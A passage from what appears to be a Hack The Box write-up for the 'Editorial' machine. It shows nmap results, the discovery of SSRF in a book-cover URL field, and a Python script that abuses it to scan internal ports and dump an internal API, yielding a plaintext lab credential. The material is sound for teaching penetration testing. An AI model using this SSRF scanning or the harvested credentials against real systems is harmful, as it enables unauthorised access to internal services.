</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
</span></span><span style="display:flex;"><span>| 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-title: Editorial Tiempo Arriba
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_ Supported Methods: OPTIONS HEAD GET
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span># Nmap done at Tue Jun 18 07:58:52 2024 -- 1 IP address (1 host up) scanned in 27.03 seconds
</span></span></code></pre></div><h4 id="http-service">HTTP Service</h4>
<p><img src="images/20240618081128.png" alt="alt text">
The <code>http://editorial.htb/upload</code> looks interesting. There&rsquo;s a field name called <code>bookurl</code> which accepts an URL and tries to load the image when the <code>Preview</code> button is clicked. It sends the following request.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /upload-cover HTTP/1.1
</span></span><span style="display:flex;"><span>Host: editorial.htb
</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
</span></span><span style="display:flex;"><span>Accept: */*
</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=---------------------------30720708513481866454123983682
</span></span><span style="display:flex;"><span>Content-Length: 372
</span></span><span style="display:flex;"><span>Origin: http://editorial.htb
</span></span><span style="display:flex;"><span>Connection: close
</span></span><span style="display:flex;"><span>Referer: http://editorial.hrb/upload
</span></span><span style="display:flex;"><span>DNT: 1
</span></span><span style="display:flex;"><span>Sec-GPC: 1 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;bookurl&#34;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>http://10.10.14.133:8000/aaa.jpeg
</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;bookfile&#34;; filename=&#34;&#34;
</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682--
</span></span></code></pre></div><p>The above request sends a GET request to <code>http://10.10.14.133:8000/aaa.jpeg</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 -m http.server
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">8000</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:8000/<span style="color:#ff79c6">)</span> ...
</span></span><span style="display:flex;"><span>10.129.49.40 - - <span style="color:#ff79c6">[</span>18/Jun/2024 08:07:01<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /aaa.jpeg HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
</span></span></code></pre></div><p>Looks like it&rsquo;s vulnerable to SSRF and we can read the data by visiting a temporary upload URL.
<img src="images/20240618081046.png" alt="alt text"></p>
<p>After this point, I tried to upload a shell but I couldn&rsquo;t execute code on the server. Also the temporary file was deleted between 1-2 minutes. So, I researched on SSRF and found an <a href="https://cyberweapons.medium.com/internal-port-scanning-via-ssrf-eb248ae6fa7b">article discussing internal port scanning using SSRF called <strong>Cross-Site Port Attack</strong>(XSPA)</a>.</p>
<p>Then, I tried Burp&rsquo;s intruder but the scan time was very slow in the community edition. Therefore, I wrote a custom python script to scan for ports and using the temporary file upload link we can grab the information about any possible hits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">discoverPorts</span>(port):
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># URL to which the request will be sent</span>
</span></span><span style="display:flex;"><span>    url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/upload-cover&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Files to be uploaded</span>
</span></span><span style="display:flex;"><span>    files <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookfile&#39;</span>: (<span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">&#39;application/octet-stream&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Form data</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookurl&#39;</span>: <span style="color:#f1fa8c">&#39;http://127.0.0.1:&#39;</span> <span style="color:#ff79c6">+</span> port
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Headers for the request</span>
</span></span><span style="display:flex;"><span>    headers <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Host&#39;</span>: <span style="color:#f1fa8c">&#39;editorial.htb&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept&#39;</span>: <span style="color:#f1fa8c">&#39;*/*&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Language&#39;</span>: <span style="color:#f1fa8c">&#39;en-US,en;q=0.5&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Encoding&#39;</span>: <span style="color:#f1fa8c">&#39;gzip, deflate, br&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Origin&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Connection&#39;</span>: <span style="color:#f1fa8c">&#39;close&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb/upload&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;DNT&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Sec-GPC&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Send the POST request with the files, form data, and headers</span>
</span></span><span style="display:flex;"><span>    response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, files<span style="color:#ff79c6">=</span>files, data<span style="color:#ff79c6">=</span>data, headers<span style="color:#ff79c6">=</span>headers)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Print the response from the server</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Found Something Interesting on Port: &#34;</span> <span style="color:#ff79c6">+</span> port)
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;static/uploads/&#34;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Getting the Interesting File&#34;</span>)
</span></span><span style="display:flex;"><span>            url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/&#39;</span> <span style="color:#ff79c6">+</span> response<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(url)
</span></span><span style="display:flex;"><span>            res_secret <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> res_secret<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;intresting-file.txt&#39;</span>,<span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>                    file<span style="color:#ff79c6">.</span>write(res_secret<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>encode())
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Nothing found on Port: &#34;</span> <span style="color:#ff79c6">+</span> port)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">getEndpointData</span>(endpoint):
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># URL to which the request will be sent</span>
</span></span><span style="display:flex;"><span>    url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/upload-cover&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Files to be uploaded</span>
</span></span><span style="display:flex;"><span>    files <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookfile&#39;</span>: (<span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">&#39;application/octet-stream&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Form data</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookurl&#39;</span>: <span style="color:#f1fa8c">&#39;http://127.0.0.1:5000&#39;</span> <span style="color:#ff79c6">+</span> endpoint
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Headers for the request</span>
</span></span><span style="display:flex;"><span>    headers <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Host&#39;</span>: <span style="color:#f1fa8c">&#39;editorial.htb&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept&#39;</span>: <span style="color:#f1fa8c">&#39;*/*&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Language&#39;</span>: <span style="color:#f1fa8c">&#39;en-US,en;q=0.5&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Encoding&#39;</span>: <span style="color:#f1fa8c">&#39;gzip, deflate, br&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Origin&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Connection&#39;</span>: <span style="color:#f1fa8c">&#39;close&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb/upload&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;DNT&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Sec-GPC&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Send the POST request with the files, form data, and headers</span>
</span></span><span style="display:flex;"><span>    response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, files<span style="color:#ff79c6">=</span>files, data<span style="color:#ff79c6">=</span>data, headers<span style="color:#ff79c6">=</span>headers)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Print the response from the server</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Found Something Interesting on endpoint: &#34;</span> <span style="color:#ff79c6">+</span> endpoint)
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;static/uploads/&#34;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Getting the Interesting File&#34;</span>)
</span></span><span style="display:flex;"><span>            url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/&#39;</span> <span style="color:#ff79c6">+</span> response<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(url)
</span></span><span style="display:flex;"><span>            res_secret <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> res_secret<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>                filename <span style="color:#ff79c6">=</span> endpoint<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>                filename <span style="color:#ff79c6">=</span> filename[<span style="color:#8be9fd;font-style:italic">len</span>(filename)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(filename,<span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>                    file<span style="color:#ff79c6">.</span>write(res_secret<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>encode())
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Nothing found on URL: &#34;</span> <span style="color:#ff79c6">+</span> url)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3000</span>, <span style="color:#bd93f9">10000</span>):
</span></span><span style="display:flex;"><span>        stop_flag <span style="color:#ff79c6">=</span> discoverPorts(<span style="color:#8be9fd;font-style:italic">str</span>(i))
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> stop_flag:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>    endpoints <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/promos&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/authors&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/changelog&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> endpoint <span style="color:#ff79c6">in</span> endpoints:
</span></span><span style="display:flex;"><span>        getEndpointData(endpoint)
</span></span><span style="display:flex;"><span>    
</span></span></code></pre></div><p>The script is a proof of concept and not refactored well but it gets the job done.</p>
<p>I found a hit on port <code>5000</code> and the output looks like the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;messages&#34;</span>: [
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;promotions&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve a list of all the promotions in our library.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/promos&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;coupons&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the list of coupons to use in our library.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;new_authors&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the welcome message sended to our new authors.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/authors&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;platform_use&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve examples of how to use the platform.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    ],
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;version&#34;</span>: [
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;changelog&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve a list of all the versions and updates of the api.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/changelog&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;latest&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the last version of api.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It seems there&rsquo;s an internal API service running on port 5000. So I tried to get all the endpoints listed here. Out of these 6 endpoints 3 of them returned 200 and JSON data.</p>
<p><strong>authors</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;template_mail_message&#34;</span>: <span style="color:#f1fa8c">&#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>changelog</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;api_route&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1/metadata/&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial El Tiempo Por Arriba&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1.1&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;api_route&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1.1/metadata/&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Ed Tiempo Arriba&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1.2&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1.2/metadata/&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;2&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.moc.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v2/metadata/&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p><strong>coupons</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;2anniversaryTWOandFOURread4&#34;</span>: {
